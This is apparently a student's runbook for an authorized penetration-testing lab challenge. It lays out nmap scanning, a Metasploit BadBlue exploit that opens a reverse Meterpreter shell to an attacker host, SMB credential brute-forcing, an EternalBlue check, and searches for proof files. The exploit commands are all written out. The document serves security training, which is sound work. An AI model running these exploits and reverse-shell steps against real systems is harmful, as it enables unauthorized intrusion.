# PWN Challenge #2 — main runbook (clean restart version)

Repository landing page for the **current plan only**: scope, checkpoints, active workflow, and next actions.

All deep attempts, dead ends, and archived methods now live in **[`3_Work/README.md`](3_Work/README.md)**.

---

## Session note (extension + restart)

- Original work session ended and an extension was granted.
- Current workflow assumes a **fresh/restarted lab session**.
- Recreate local folders and logging each session before doing technical steps.

---

## Identity stamp + session logging

Run in the same terminal/session where work is happening:

**Linux / Kali**

```bash
echo afrocha; date
```

**Windows cmd**

```cmd
echo afrocha %date% %time%
```

**Transcript logging block (use this exact flow)**

```bash
mkdir -p ~/logs
script -a ~/logs/pwn2_$(date +%Y%m%d_%H%M%S).log
echo afrocha; date
pwd
# ... work ...
exit
```

---

## Checkpoint map

| CP | Gate | Status |
|----|------|--------|
| **CP0** | Lab + folders | ✅ Done (rerun each reset) |
| **CP1** | Logging + stamps | ✅ Habit established |
| **CP2** | Host ID / vulnerability mapping | ✅ Done |
| **CP3** | Exploitation (get in) | ✅ Done on `.112` |
| **CP4** | Proof retrieval (`proof.txt`) | In progress |
| **CP5** | Pivot / additional host | Pending |
| **CP6** | Report quality + evidence packaging | In progress |
| **CP7** | Git hygiene + final submit | In progress |

> 🟧 **CP6 focus:** tighten report structure to mirror this README (Part 2 vuln-by-host, Part 3 exploitation only, Part 4 proof-only by host).
>
> 🟧 **CP7 focus:** final evidence pass, screenshot naming consistency, and submission checklist closure.

---

## Where things live

| Path | Purpose |
|------|--------|
| [`README.md`](README.md) | Main runbook (clean path forward) |
| [`3_Work/README.md`](3_Work/README.md) | Tried/failed paths, archived methods, raw notes |
| [`0_Provided_Docs/`](0_Provided_Docs/) | Challenge docs + grading rubric |
| [`1_Screenshots/`](1_Screenshots/) | Evidence images |
| [`2_Final_Report/`](2_Final_Report/) | Final report draft (`EPT_PWN2_Report.tex`) |

---

## Scope

- Authorized range: `10.20.160.10-200`
- Known hosts:
  - `10.20.160.63` (`MATHIS`) — SMB (`139/445`)
  - `10.20.160.112` (`JUAN`) — BadBlue on `8080`

---

## 0) Workspace reset (CP0)

Use these folder names (no extra `pwn2_` prefix):

```bash
echo afrocha; date
mkdir -p ~/logs ~/scans ~/loot
```

| Directory | Use |
|-----------|-----|
| `~/logs` | `script` session logs |
| `~/scans` | `nmap -oA` outputs |
| `~/loot` | notes, exports, hit files |

```bash
nmap -sn 10.20.160.10-200 -oA ~/scans/discovery_01
```

---

## 1) Discovery / host map (CP1 → CP2)

```bash
echo afrocha; date
nmap -sS -sV -T4 10.20.160.63 -oA ~/scans/host_63
nmap -sS -sV -T4 10.20.160.112 -oA ~/scans/host_112
```

Evidence:

- `1_Screenshots/01_discovery_nmap_sn_pwn2_scans_afrocha.png`
- `1_Screenshots/02_hosts_63_112_nmap_sv_afrocha.png`

---

## 2) Vulnerability analysis by host (CP2)

This section is vulnerability-focused only (not exploitation execution).

### 2A) `10.20.160.112` (`JUAN`) — vulnerability profile

**Observed surface**

- `8080/tcp` with **BadBlue httpd 2.7**.
- Prior sessions confirmed this lane is exploitable in-lab.

**Vulnerability callout**

- Legacy/exposed web service with known Metasploit path (`badblue_passthru`) and demonstrated remote execution potential.

**Attack strategy**

- **Primary COA-1 (already validated):** Re-use BadBlue exploit chain to regain shell quickly.
- **COA-2:** If module behavior changes, re-validate with `search badblue`, `searchsploit badblue 2.7`, and product-matched alternatives.
- **COA-3:** If service profile changed, re-scan and pivot to newly exposed service.

**Tried status**

- ✅ Successful exploitation path previously achieved (see `14_badblue_exploit_success_meterpreter_session.png`).

### 2B) `10.20.160.63` (`MATHIS`) — vulnerability profile

**Observed surface**

- `139/tcp`, `445/tcp` (SMB / NetBIOS), Win7 SP1 profile.

**Vulnerability callout**

- SMB attack surface is present, but no confirmed unauthenticated RCE in logged attempts.

**Attack strategy**

- **Primary COA-1 (highest chance): credentialed SMB access**, then share/file read.
  - Best tools in your current set: `auxiliary/scanner/smb/smb_login`, `smbmap`, `smbclient`, `enum4linux`.
- **COA-2 (validation lane): SMB vuln confirmation only**, exploit only if positive.
  - Best tools: `nmap --script smb-vuln-*`, `auxiliary/scanner/smb/smb_ms17_010`, `exploit/windows/smb/ms17_010_eternalblue` (`check` first).
- **COA-3 (time-boxed fallback):** if `.63` remains negative after credential + vuln checks, stop and shift effort to `.112` proof retrieval and/or new in-scope host discovery.

**Tried status**

- ⚠️ Multiple `.63` SMB paths attempted previously with no shell; detailed command history moved to [`3_Work/README.md`](3_Work/README.md).

---

## 3) Exploitation only (CP3)

This section is only for **getting in**.

### 3A) Exploit lane: `10.20.160.112` (`JUAN`)

```bash
echo afrocha; date
msfconsole
```

```text
workspace -a pwn2
use exploit/windows/http/badblue_passthru
set RHOSTS 10.20.160.112
set RPORT 8080
set LHOST 10.20.150.101
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

Success indicator: active Meterpreter session and `getuid`/`sysinfo` output.

### 3B) Exploit lane: `10.20.160.63` (`MATHIS`)

Use only as a time-boxed secondary lane and in this order:

1. **Credential-first lane (most likely to work)**  
   Try SMB auth + share access before forcing RCE.

```text
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.20.160.63
set RPORT 445
set USER_FILE ~/loot/users_63.txt
set PASS_FILE ~/loot/pass_63.txt
set STOP_ON_SUCCESS true
set VERBOSE true
run
```

```bash
smbmap -H 10.20.160.63 -u '<user>' -p '<pass>'
smbclient -L //10.20.160.63 -U '<user>%<pass>'
```

2. **RCE lane only if checks indicate vulnerable target**

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.20.160.63
set RPORT 445
check
```

If checks remain negative, do not burn time here; log and move on (details in `3_Work`).

---

## 4) Proof retrieval only (`proof.txt` / `local.txt`) — by host (CP4)

### 4A) `10.20.160.112` (`JUAN`) proof search

Most likely successful proof workflow on `.112` (given your current access):

1. Regain Meterpreter with `badblue_passthru`.
2. Drop to Windows `cmd` shell.
3. Search exact names first, then wildcard, then filter.
4. `type` discovered files and screenshot with stamp.

```text
sessions -l
sessions -i <id>
shell
```

```cmd
echo afrocha %date% %time%
whoami
hostname
dir C:\Users\Juan\Desktop /a
dir C:\Users\Administrator\Desktop /a
dir C:\Users\Public\Desktop /a
dir "C:\Program Files (x86)\BadBlue\EE" /s /b *proof*.txt
dir "C:\Program Files (x86)\BadBlue\EE" /s /b *local*.txt
for /r C:\ %i in (proof.txt) do @echo %i>> "%USERPROFILE%\Desktop\proof_exact.txt"
for /r C:\ %i in (local.txt) do @echo %i>> "%USERPROFILE%\Desktop\local_exact.txt"
type "%USERPROFILE%\Desktop\proof_exact.txt"
type "%USERPROFILE%\Desktop\local_exact.txt"
dir C:\Users\ /s /b *proof*.txt
dir C:\Users\ /s /b *local*.txt
dir C:\ /s /b proof.txt
dir C:\ /s /b local.txt
```

Then `type` each candidate path and capture screenshots.

### 4B) `10.20.160.63` (`MATHIS`) proof search

Most likely successful proof workflow on `.63` is **credentialed share access**, not unauthenticated RCE.

If creds hit:

```bash
smbmap -H 10.20.160.63 -u '<user>' -p '<pass>'
smbclient -L //10.20.160.63 -U '<user>%<pass>'
smbclient //10.20.160.63/<share> -U '<user>%<pass>' -c "recurse ON; prompt OFF; ls; mget *.txt"
```

- Pull candidate files to Kali, inspect with `cat`, and capture stamped evidence.

If no access path:

- Log `.63` as negative for current tactics in `3_Work/README.md`.
- Prioritize `.112` proof completion and discovery of additional in-scope host(s).

---

## 5) CP5 / CP6 / CP7 execution notes

- **CP5:** only after CP4 evidence is captured (or explicitly blocked and documented).
- **CP6:** finalize `2_Final_Report/EPT_PWN2_Report.tex` with evidence-driven structure.
- **CP7:** commit/submit only after proof screenshots, host summaries, and attempted-path logs are synced.

---

## Anti-cheat quick reference

| Environment | Command |
|-------------|---------|
| Linux / Kali | `echo afrocha; date` |
| Windows cmd | `echo afrocha %date% %time%` |

---

## Submission checklist

- [ ] Re-ran CP0 folder/log setup after restart
- [ ] CP2 host vulnerability sections updated by IP
- [ ] CP3 exploit evidence captured
- [ ] CP4 proof artifacts (`proof.txt` / `local.txt`) captured with stamps
- [ ] Failed/negative paths documented in `3_Work/README.md`
- [ ] Report updated and aligned to this flow
